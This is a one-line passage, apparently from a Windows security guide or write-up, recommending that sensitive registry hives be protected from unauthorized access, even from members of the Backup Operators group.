- **Registry Security**: Registry hives containing sensitive information should be protected from unauthorized access, even for Backup Operators
